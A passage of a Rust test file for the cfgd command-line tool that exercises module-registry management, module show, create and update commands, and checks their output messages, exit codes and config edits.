#[test]
fn cmd_module_registry_add_creates_entry() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_registry_add(
        &cli,
        &printer,
        "https://github.com/team/modules.git",
        Some("team"),
    )
    .unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Added module registry 'team'"),
        "should confirm add, got: {output}"
    );

    // Verify config was updated
    let contents = std::fs::read_to_string(dir.path().join("cfgd.yaml")).unwrap();
    assert!(
        contents.contains("team"),
        "config should contain registry name, got: {contents}"
    );
}

#[test]
fn cmd_module_registry_add_duplicate_is_noop() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    cmd_module_registry_add(
        &cli,
        &printer1,
        "https://github.com/team/modules.git",
        Some("team"),
    )
    .unwrap();

    // Second add should be a no-op
    let (printer2, buf2) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_registry_add(
        &cli,
        &printer2,
        "https://github.com/team/other.git",
        Some("team"),
    )
    .unwrap();
    drop(printer2);

    let output = buf2.lock().unwrap();
    assert!(
        output.contains("already configured"),
        "should report already configured, got: {output}"
    );
}

#[test]
fn cmd_module_registry_add_no_config_fails() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_registry_add(&cli, &printer, "https://example.com/reg.git", Some("test"))
        .unwrap_err();
    assert!(
        err.to_string().contains("cfgd.yaml"),
        "should fail without config, got: {err}"
    );
}

// ─── cmd_module_registry_remove ─────────────────────────────

#[test]
fn cmd_module_registry_remove_existing() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    // Add first
    cmd_module_registry_add(
        &cli,
        &printer1,
        "https://example.com/reg.git",
        Some("myrepo"),
    )
    .unwrap();

    // Remove
    let (printer2, buf2) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_registry_remove(&cli, &printer2, "myrepo", false).unwrap();
    drop(printer2);

    let output = buf2.lock().unwrap();
    assert!(
        output.contains("Removed module registry 'myrepo'"),
        "should confirm removal, got: {output}"
    );
}

#[test]
fn cmd_module_registry_remove_not_found() {
    // Removing an absent registry is now a strict not-found error (exit 6),
    // uniform with every other named-resource miss — not an idempotent no-op.
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, _buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let err = cmd_module_registry_remove(&cli, &printer, "nonexistent", false).unwrap_err();
    drop(printer);

    let meta = err
        .downcast_ref::<crate::cli::CliErrorMeta>()
        .expect("handler returns CliErrorMeta");
    assert_eq!(meta.error_kind, "registry_not_found");
    assert_eq!(
        crate::cli::exit_code_for_anyhow(&err),
        cfgd_core::exit::ExitCode::NotFound,
    );
}

// ─── cmd_module_registry_rename ─────────────────────────────

#[test]
fn cmd_module_registry_rename_success() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    cmd_module_registry_add(
        &cli,
        &printer1,
        "https://example.com/reg.git",
        Some("old-name"),
    )
    .unwrap();

    let (printer2, buf2) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_registry_rename(&cli, &printer2, "old-name", "new-name").unwrap();
    drop(printer2);

    let output = buf2.lock().unwrap();
    assert!(
        output.contains("Renamed registry 'old-name' to 'new-name'"),
        "should confirm rename, got: {output}"
    );

    // Verify config
    let contents = std::fs::read_to_string(dir.path().join("cfgd.yaml")).unwrap();
    assert!(contents.contains("new-name"));
    assert!(!contents.contains("old-name"));
}

#[test]
fn cmd_module_registry_rename_not_found_fails() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_registry_rename(&cli, &printer, "ghost", "new").unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "should report not found, got: {err}"
    );
}

#[test]
fn cmd_module_registry_rename_target_exists_fails() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    cmd_module_registry_add(&cli, &printer1, "https://example.com/a.git", Some("alpha")).unwrap();
    cmd_module_registry_add(&cli, &printer1, "https://example.com/b.git", Some("beta")).unwrap();

    let printer2 = make_printer();
    let err = cmd_module_registry_rename(&cli, &printer2, "alpha", "beta").unwrap_err();
    assert!(
        err.to_string().contains("already exists"),
        "should report already exists, got: {err}"
    );
}

// ─── cmd_module_registry_list ───────────────────────────────

#[test]
fn cmd_module_registry_list_empty() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_registry_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("No module registries"),
        "should report no registries, got: {output}"
    );
}

#[test]
fn cmd_module_registry_list_with_entries() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    cmd_module_registry_add(&cli, &printer1, "https://example.com/a.git", Some("alpha")).unwrap();
    cmd_module_registry_add(&cli, &printer1, "https://example.com/b.git", Some("beta")).unwrap();

    let (printer2, buf2) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_registry_list(&cli, &printer2).unwrap();
    drop(printer2);

    let output = buf2.lock().unwrap();
    assert!(output.contains("alpha"), "should list alpha, got: {output}");
    assert!(output.contains("beta"), "should list beta, got: {output}");
}

#[test]
fn cmd_module_registry_list_json() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    cmd_module_registry_add(&cli, &printer1, "https://example.com/r.git", Some("team")).unwrap();

    let cli_json = test_cli_json(dir.path());
    let (printer2, cap) = cfgd_core::output::Printer::for_test_doc();
    cmd_module_registry_list(&cli_json, &printer2).unwrap();
    drop(printer2);

    let json = cap.json().expect("doc captured json");
    assert!(json.is_array());
    let arr = json.as_array().unwrap();
    assert_eq!(arr.len(), 1);
    assert_eq!(arr[0]["name"], "team");
    assert!(arr[0]["url"].as_str().unwrap().contains("example.com"));
}

#[test]
fn cmd_module_registry_list_no_config() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_registry_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("No config found"),
        "should report no config, got: {output}"
    );
}

// ─── cmd_module_keys_list ───────────────────────────────────

#[test]
fn cmd_module_keys_list_no_keys() {
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_keys_list(&printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("No signing keys found"),
        "should report no keys, got: {output}"
    );
}

// ─── cmd_module_search — no registries ──────────────────────

#[test]
fn cmd_module_search_no_config_fails() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_search(&cli, &printer, "test").unwrap_err();
    assert!(
        err.to_string().contains("config"),
        "should fail without config, got: {err}"
    );
}

#[test]
fn cmd_module_search_no_registries() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_search(&cli, &printer, "test").unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("No module registries"),
        "should report no registries, got: {output}"
    );
}

#[test]
fn cmd_module_search_no_registries_json() {
    let dir = setup_config_dir();
    let cli = test_cli_json(dir.path());
    let (printer, cap) = cfgd_core::output::Printer::for_test_doc();

    cmd_module_search(&cli, &printer, "test").unwrap();
    drop(printer);

    let json = cap.json().expect("doc captured json");
    assert!(json.is_array());
    assert_eq!(json.as_array().unwrap().len(), 0);
}

// ─── cmd_module_keys_generate — no cosign ───────────────────

#[test]
#[serial_test::serial]
fn cmd_module_keys_generate_no_cosign_fails() {
    // Parallel CosignTestShim tests set CFGD_COSIGN_BIN; force require_cosign
    // through the PATH-only branch so the missing-tool error fires here.
    let _g = cfgd_core::test_helpers::EnvVarGuard::unset("CFGD_COSIGN_BIN");
    if cfgd_core::command_available("cosign") {
        return; // skip if cosign is actually installed
    }
    let printer = make_printer();
    let err = cmd_module_keys_generate(&printer, None).unwrap_err();
    assert!(
        err.to_string().contains("cosign not found"),
        "should report cosign missing, got: {err}"
    );
}

// ─── cmd_module_push / pull — precondition errors ───────────

#[test]
fn cmd_module_push_no_module_yaml_fails() {
    let dir = tempfile::tempdir().unwrap();
    let printer = make_printer();

    let opts = PushOptions {
        platform: None,
        apply: false,
        sign: false,
        key: None,
        attest: false,
    };
    let err = cmd_module_push(
        &printer,
        dir.path().to_str().unwrap(),
        "oci.example.com/test:v1",
        opts,
    )
    .unwrap_err();
    assert!(
        err.to_string().contains("does not contain a module.yaml"),
        "should report missing module.yaml, got: {err}"
    );
}

#[test]
fn cmd_module_build_no_module_yaml_fails() {
    let dir = tempfile::tempdir().unwrap();
    let printer = make_printer();

    let err = cmd_module_build(
        &printer,
        dir.path().to_str().unwrap(),
        None,
        None,
        None,
        false,
        None,
    )
    .unwrap_err();
    assert!(
        err.to_string().contains("does not contain a module.yaml"),
        "should report missing module.yaml, got: {err}"
    );
}

// ─── cmd_module_export — not-found ──────────────────────────

#[test]
fn cmd_module_export_not_found() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_export(
        &cli,
        &printer,
        "ghost",
        &super::ExportFormat::Devcontainer,
        None,
    )
    .unwrap_err();
    assert!(
        err.to_string().contains("not found"),
        "should report not found, got: {err}"
    );
    // Exit-6 uniformity: the inner ModuleError::NotFound must survive the wrap so
    // main.rs resolves ExitCode::NotFound (6), matching every other missing-module site.
    assert_eq!(
        crate::cli::exit_code_for_anyhow(&err),
        cfgd_core::exit::ExitCode::NotFound,
    );
}

// ─── profiles_using_module — edge cases ─────────────────────

#[test]
fn profiles_using_module_empty_dir() {
    let dir = tempfile::tempdir().unwrap();
    let result = profiles_using_module(dir.path(), "test").unwrap();
    assert!(result.is_empty());
}

#[test]
fn profiles_using_module_nonexistent_dir() {
    let dir = tempfile::tempdir().unwrap();
    let result = profiles_using_module(&dir.path().join("nonexistent"), "test").unwrap();
    assert!(result.is_empty());
}

// ─── cmd_module_registry_rename cascades to profiles ────────

#[test]
fn cmd_module_registry_rename_cascades_to_profiles() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    cmd_module_registry_add(&cli, &printer, "https://example.com/r.git", Some("old")).unwrap();

    // Add a profile that references old/somemod
    let profile_path = dir.path().join("profiles").join("default.yaml");
    let mut pdoc = config::load_profile(&profile_path).unwrap();
    pdoc.spec.modules.push("old/somemod".to_string());
    let yaml = serde_yaml::to_string(&pdoc).unwrap();
    std::fs::write(&profile_path, &yaml).unwrap();

    cmd_module_registry_rename(&cli, &printer, "old", "fresh").unwrap();

    let pdoc = config::load_profile(&profile_path).unwrap();
    assert!(
        pdoc.spec.modules.contains(&"fresh/somemod".to_string()),
        "profile should have updated reference, got: {:?}",
        pdoc.spec.modules
    );
    assert!(
        !pdoc.spec.modules.contains(&"old/somemod".to_string()),
        "old reference should be gone"
    );
}

// ─── cmd_module_show — JSON with lockfile entry (remote source) ─

#[test]
fn cmd_module_show_json_with_lockfile_entry() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "remote-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: remote-mod\nspec:\n  packages:\n    - name: tmux\n",
    );

    // Write a lockfile entry for this module
    let lockfile = cfgd_core::config::ModuleLockfile {
        modules: vec![cfgd_core::config::ModuleLockEntry {
            name: "remote-mod".to_string(),
            url: "https://github.com/team/modules.git@v1.0".to_string(),
            pinned_ref: "v1.0".to_string(),
            commit: "abc123def456".to_string(),
            integrity: "sha256:deadbeef".to_string(),
            subdir: Some("modules/remote-mod".to_string()),
        }],
    };
    modules::save_lockfile(dir.path(), &lockfile).unwrap();

    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_show(&cli, &printer, "remote-mod", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    assert_eq!(json["name"], "remote-mod");
    assert_eq!(json["source"], "remote", "lockfile module should be remote");
    assert!(
        json["spec"]["packages"].as_array().unwrap().len() == 1,
        "should have 1 package"
    );
}

// ─── cmd_module_show — table with lockfile entry (remote source) ─

#[test]
fn cmd_module_show_table_with_lockfile_entry() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "locked-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: locked-mod\nspec:\n  packages:\n    - name: git\n",
    );

    let lockfile = cfgd_core::config::ModuleLockfile {
        modules: vec![cfgd_core::config::ModuleLockEntry {
            name: "locked-mod".to_string(),
            url: "https://github.com/team/modules.git@v2.0".to_string(),
            pinned_ref: "v2.0".to_string(),
            commit: "aabbccdd".to_string(),
            integrity: "sha256:cafebabe".to_string(),
            subdir: None,
        }],
    };
    modules::save_lockfile(dir.path(), &lockfile).unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "locked-mod", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("remote (locked)"),
        "should show 'remote (locked)' source, got: {output}"
    );
    assert!(
        output.contains("v2.0"),
        "should show pinned ref, got: {output}"
    );
    assert!(
        output.contains("aabbccdd"),
        "should show commit, got: {output}"
    );
    assert!(
        output.contains("sha256:cafebabe"),
        "should show integrity, got: {output}"
    );
}

// ─── cmd_module_show — aliases section ─────────────────────────

#[test]
fn cmd_module_show_aliases() {
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: alias-mod\nspec:\n  aliases:\n    - name: gs\n      command: git status\n    - name: gp\n      command: git push\n";
    make_module(dir.path(), "alias-mod", yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "alias-mod", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Aliases"),
        "should have Aliases section, got: {output}"
    );
    assert!(
        output.contains("git status"),
        "should show alias command, got: {output}"
    );
    assert!(
        output.contains("git push"),
        "should show alias command, got: {output}"
    );
}

// ─── cmd_module_show — scripts section ─────────────────────────

#[test]
fn cmd_module_show_scripts() {
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: script-mod\nspec:\n  scripts:\n    postApply:\n      - echo setup\n      - make install\n";
    make_module(dir.path(), "script-mod", yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "script-mod", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Post-apply Scripts"),
        "should have post-apply scripts section, got: {output}"
    );
    assert!(
        output.contains("echo setup"),
        "should show script, got: {output}"
    );
    assert!(
        output.contains("make install"),
        "should show script, got: {output}"
    );
}

// ─── cmd_module_show — files with git source indicator ─────────

#[test]
fn cmd_module_show_files_with_git_source() {
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: git-file-mod\nspec:\n  files:\n    - source: https://github.com/user/repo.git//config.toml\n      target: ~/.config/app/config.toml\n    - source: files/local.conf\n      target: ~/.local.conf\n";
    make_module(dir.path(), "git-file-mod", yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "git-file-mod", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Files"),
        "should have Files section, got: {output}"
    );
    assert!(
        output.contains("(git)"),
        "git sources should have (git) indicator, got: {output}"
    );
}

// ─── cmd_module_create — with packages and --set overrides ─────

#[test]
fn cmd_module_create_with_packages_and_sets() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleCreateArgs {
        packages: vec!["ripgrep".to_string(), "fd-find".to_string()],
        sets: vec![
            "package.ripgrep.minVersion=13.0".to_string(),
            "package.fd-find.platforms=linux,macos".to_string(),
        ],
        ..make_module_create_args("pkg-set-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();
    drop(printer);

    let (doc, _) = load_module_document(dir.path(), "pkg-set-mod").unwrap();
    assert_eq!(doc.spec.packages.len(), 2);
    assert_eq!(
        doc.spec.packages[0].min_version.as_deref(),
        Some("13.0"),
        "ripgrep should have minVersion set"
    );
    assert_eq!(
        doc.spec.packages[1].platforms,
        vec!["linux", "macos"],
        "fd-find should have platforms set"
    );

    let output = buf.lock().unwrap();
    assert!(
        output.contains("ripgrep"),
        "should list ripgrep in output, got: {output}"
    );
    assert!(
        output.contains("fd-find"),
        "should list fd-find in output, got: {output}"
    );
}

// ─── cmd_module_create — duplicate name fails ──────────────────

#[test]
fn cmd_module_create_duplicate_name_fails() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleCreateArgs {
        description: Some("test module".to_string()),
        ..make_module_create_args("dup-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();

    // Second create with same name should fail
    let printer2 = make_printer();
    let err = cmd_module_create(&cli, &printer2, &args).unwrap_err();
    assert!(
        err.to_string().contains("already exists"),
        "should report already exists, got: {err}"
    );
}

// ─── cmd_module_create — post-apply scripts with shell escape ──

#[test]
fn cmd_module_create_post_apply_scripts_escape() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleCreateArgs {
        post_apply: vec![r"echo hello \! world".to_string()],
        ..make_module_create_args("script-esc-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "script-esc-mod").unwrap();
    let scripts = doc.spec.scripts.unwrap();
    // Shell escape: \! should be normalized to !
    assert_eq!(
        scripts.post_apply[0].run_str(),
        "echo hello ! world",
        "backslash-exclamation should be unescaped"
    );
}

// ─── cmd_module_create — with manager-prefixed packages ────────

#[test]
fn cmd_module_create_with_prefixed_packages() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleCreateArgs {
        packages: vec!["brew:ripgrep".to_string(), "cargo:fd-find".to_string()],
        ..make_module_create_args("prefix-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "prefix-mod").unwrap();
    assert_eq!(doc.spec.packages[0].name, "ripgrep");
    assert_eq!(doc.spec.packages[0].prefer, vec!["brew"]);
    assert_eq!(doc.spec.packages[1].name, "fd-find");
    assert_eq!(doc.spec.packages[1].prefer, vec!["cargo"]);
}

// ─── cmd_module_create — with file import ──────────────────────

#[test]
fn cmd_module_create_with_file_import() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    // Create a source file to import
    let source_file = dir.path().join("my-config.toml");
    std::fs::write(&source_file, "[settings]\nfoo = true\n").unwrap();

    let target = "~/.config/myapp/config.toml";
    let file_spec = format!("{}:{}", source_file.display(), target);

    let args = super::ModuleCreateArgs {
        files: vec![file_spec],
        ..make_module_create_args("file-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();
    drop(printer);

    let (doc, _) = load_module_document(dir.path(), "file-mod").unwrap();
    assert_eq!(doc.spec.files.len(), 1);
    assert_eq!(doc.spec.files[0].source, "files/my-config.toml");
    assert!(doc.spec.files[0].target.contains("config.toml"));

    // Verify the file was actually copied into the module
    let copied_file = dir.path().join("modules/file-mod/files/my-config.toml");
    assert!(
        copied_file.exists(),
        "file should be copied into module files/ dir"
    );
    let contents = std::fs::read_to_string(&copied_file).unwrap();
    assert!(contents.contains("foo = true"));

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Files"),
        "should report file count, got: {output}"
    );
}

// ─── cmd_module_create — duplicate file basenames fail ─────────

#[test]
fn cmd_module_create_duplicate_file_basenames_fail() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    // Create two files with the same basename in different dirs
    let dir_a = dir.path().join("a");
    let dir_b = dir.path().join("b");
    std::fs::create_dir_all(&dir_a).unwrap();
    std::fs::create_dir_all(&dir_b).unwrap();
    std::fs::write(dir_a.join("config.toml"), "a").unwrap();
    std::fs::write(dir_b.join("config.toml"), "b").unwrap();

    let args = super::ModuleCreateArgs {
        files: vec![
            format!("{}:~/.a/config.toml", dir_a.join("config.toml").display()),
            format!("{}:~/.b/config.toml", dir_b.join("config.toml").display()),
        ],
        ..make_module_create_args("dup-file-mod")
    };
    let err = cmd_module_create(&cli, &printer, &args).unwrap_err();
    assert!(
        err.to_string().contains("Duplicate file basename"),
        "should report duplicate basenames, got: {err}"
    );
}

// ─── cmd_module_create — private files add to gitignore ────────

#[test]
fn cmd_module_create_private_files_gitignore() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let source_file = dir.path().join("secret.key");
    std::fs::write(&source_file, "private-data").unwrap();

    let args = super::ModuleCreateArgs {
        files: vec![format!("{}:~/.ssh/secret.key", source_file.display())],
        private: true,
        ..make_module_create_args("priv-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "priv-mod").unwrap();
    assert!(doc.spec.files[0].private, "file should be marked private");

    let gitignore = std::fs::read_to_string(dir.path().join(".gitignore")).unwrap();
    assert!(
        gitignore.contains("modules/priv-mod/files/secret.key"),
        "gitignore should contain private file path, got: {gitignore}"
    );
}

// ─── cmd_module_update_local — --set overrides ─────────────────

#[test]
fn cmd_module_update_with_set_overrides() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages:\n    - name: curl\n    - name: wget\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        sets: vec![
            "package.curl.minVersion=8.0".to_string(),
            "package.wget.deny=snap".to_string(),
        ],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.packages[0].min_version.as_deref(), Some("8.0"));
    assert_eq!(doc.spec.packages[1].deny, vec!["snap"]);
}

// ─── cmd_module_update_local — add/remove packages ─────────────

#[test]
fn cmd_module_update_add_and_remove_packages() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages:\n    - name: curl\n    - name: wget\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        packages: vec!["ripgrep".to_string(), "-wget".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    let names: Vec<&str> = doc.spec.packages.iter().map(|p| p.name.as_str()).collect();
    assert!(names.contains(&"curl"), "curl should remain");
    assert!(names.contains(&"ripgrep"), "ripgrep should be added");
    assert!(!names.contains(&"wget"), "wget should be removed");

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Added package: ripgrep"),
        "should confirm addition, got: {output}"
    );
    assert!(
        output.contains("Removed package: wget"),
        "should confirm removal, got: {output}"
    );
}

// ─── cmd_module_update_local — add duplicate package is noop ────

#[test]
fn cmd_module_update_add_duplicate_package_noop() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages:\n    - name: curl\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        packages: vec!["curl".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("already in module"),
        "should note duplicate, got: {output}"
    );
}

// ─── cmd_module_update_local — remove nonexistent package warns ─

#[test]
fn cmd_module_update_remove_nonexistent_package_warns() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages:\n    - name: curl\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        packages: vec!["-nonexistent".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("not found in module"),
        "should warn about nonexistent package, got: {output}"
    );
}

// ─── cmd_module_update_local — remove nonexistent env warns ─────

#[test]
fn cmd_module_update_remove_nonexistent_env_warns() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        env: vec!["-NONEXISTENT".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("not found"),
        "should warn about nonexistent env var, got: {output}"
    );
}

// ─── cmd_module_update_local — remove nonexistent alias warns ───

#[test]
fn cmd_module_update_remove_nonexistent_alias_warns() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        aliases: vec!["-noalias".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("not found"),
        "should warn about nonexistent alias, got: {output}"
    );
}

// ─── cmd_module_update_local — remove nonexistent depends warns ─

#[test]
fn cmd_module_update_remove_nonexistent_depends_warns() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        depends: vec!["-nonexistent".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("not found"),
        "should warn about nonexistent dep, got: {output}"
    );
}

// ─── cmd_module_update_local — remove nonexistent script warns ──

#[test]
fn cmd_module_update_remove_nonexistent_script_warns() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  scripts:\n    postApply:\n      - echo hello\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        post_apply: vec!["-nonexistent script".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("not found"),
        "should warn about nonexistent script, got: {output}"
    );
}

// ─── cmd_module_update_local — description empty clears ─────────

#[test]
fn cmd_module_update_empty_description_clears() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\n  description: Old desc\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        description: Some(String::new()),
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(
